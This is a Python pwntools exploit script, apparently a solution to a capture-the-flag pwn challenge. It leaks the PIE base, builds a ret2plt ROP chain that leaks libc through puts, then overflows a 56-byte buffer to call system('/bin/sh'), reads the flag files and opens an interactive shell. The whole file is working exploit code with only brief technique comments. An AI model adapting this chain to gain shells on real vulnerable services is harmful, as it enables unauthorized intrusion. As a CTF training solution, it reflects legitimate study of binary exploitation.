#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  b *vuln+45
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# Get PIE leak #
p.recvuntil(b'main is at ')
elf.address = int(p.recvline()[:-1], 16) - elf.sym.main
print(f"PIE base: {elf.address:#x}")

pop_rdi = elf.address + 0x11a9
ret = pop_rdi + 0x1
print(f"pop rdi: {pop_rdi:#x}")
print(f"ret: {ret:#x}")
# ========== #

# Ret2plt to get leak #
leak_libc_rop = p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main)
ret2plt_payload = b'A' * 48 + b'B' * 8 + leak_libc_rop
p.sendafter(b'Say something: ', ret2plt_payload)
# ========== #

# Parse libc leak #
p.recvuntil(b'Thanks.\n')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym.puts
print(f"libc base: {libc.address:#x}")
# ========== #

# Ret2libc attack #
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
payload = b'X' * 48 + b'Y' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter(b'Say something: ', payload)
# ========== #

sleep(0.5)
p.sendline(b'ls ; cat flag*')

p.interactive()

# NOTE:
# Buffer Overflow
# Ret2plt
# Ret2libc
